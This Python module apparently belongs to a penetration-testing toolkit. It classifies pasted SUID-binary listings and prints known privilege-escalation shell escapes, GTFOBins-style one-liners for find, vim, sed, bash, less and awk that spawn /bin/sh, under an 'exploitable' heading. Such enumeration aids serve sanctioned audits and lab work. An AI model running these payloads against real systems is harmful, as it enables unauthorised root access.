import sys

# ==============================
# RULE DEFINITIONS (THE BRAINS)
# ==============================

RULES = {
    "find": {
        "type": "gtfobins",
        "payload": "/usr/bin/find . -exec /bin/sh \\; -quit"
    },
    "vim": {
        "type": "gtfobins",
        "payload": "/usr/bin/vim -c ':!/bin/sh'"
    },
    "sed": {
        "type": "gtfobins",
        "payload": "sed -n '1e exec sh 1>&0' /etc/hosts"
    },
    "bash": {
        "type": "gtfobins",
        "payload": "/bin/bash -p"
    },
    "less": {
        "type": "gtfobins",
        "payload": "less /etc/passwd  # then !sh"
    },
    "awk": {
        "type": "gtfobins",
        "payload": "awk 'BEGIN {system(\"/bin/sh\")}'"
    },
}

# Known noise
IGNORE = {
    "su", "passwd", "chsh", "gpasswd", "newgrp",
    "mount", "umount", "ping"
}

# ==============================
# CORE LOGIC
# ==============================

def classify(binary_path):
    name = binary_path.split("/")[-1]

    if name in RULES:
        return ("exploit", name, RULES[name])
    elif name in IGNORE:
        return ("ignore", name, None)
    else:
        return ("interesting", name, None)

# ==============================
# MAIN MODULE
# ==============================

def run(data, cred, args):
    # --- V2026 PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    W_BOLD, DIM = '\033[1m\033[37m', '\033[2m'

    print(f"\n{B}[*]{W} {W_BOLD}ANALYZER: SUID BINARY CLASSIFICATION{W}")
    print(f"{DIM}Paste find results (Ctrl+D to finish):{W}\n")

    try:
        input_data = sys.stdin.read().strip()
        if not input_data:
            print(f"{R}[!] No data received.{W}")
            return data
        lines = input_data.split("\n")
    except EOFError:
        return data

    results = {"exploit": [], "interesting": [], "ignore": []}

    for line in lines:
        line = line.strip()
        if not line: continue
        category, name, rule = classify(line)
        
        if category == "exploit":
            results["exploit"].append((line, rule))
        elif category == "interesting":
            results["interesting"].append(line)
        else:
            results["ignore"].append(line)

    # --- RENDER: EXPLOITABLE ---
    if results["exploit"]:
        print(f"\n{G}┌── HIGH VALUE: EXPLOITABLE SUIDS ────────────────────────┐{W}")
        for path, rule in results["exploit"]:
            print(f"{G}│{W} {B}❯{W} {W_BOLD}{path}{W}")
            print(f"{G}│{W}   {G}payload:{W} {rule['payload']}")
        print(f"{G}└──────────────────────────────────────────────────────────┘{W}")

    # --- RENDER: INTERESTING ---
    if results["interesting"]:
        print(f"\n{Y}┌── ATTENTION: UNKNOWN/INTERESTING ───────────────────────┐{W}")
        for path in results["interesting"]:
            print(f"{Y}│{W} {B}❯{W} {W_BOLD}{path}{W}")
            print(f"{Y}│{W}   {C}advice:{W} check for shared object hijacking or strings")
        print(f"{Y}└──────────────────────────────────────────────────────────┘{W}")

    # --- RENDER: IGNORE ---
    if results["ignore"]:
        print(f"\n{DIM}┌── IGNORED: STANDARD SYSTEM BINARIES ─────────────────────┐{W}")
        for path in results["ignore"]:
            print(f"{DIM}│{W} {DIM}❯{W} {path}")
        print(f"{DIM}└──────────────────────────────────────────────────────────┘{W}")

    print(f"\n{C}>> ANALYSIS COMPLETE: {len(lines)} binaries processed.{W}\n")
    return data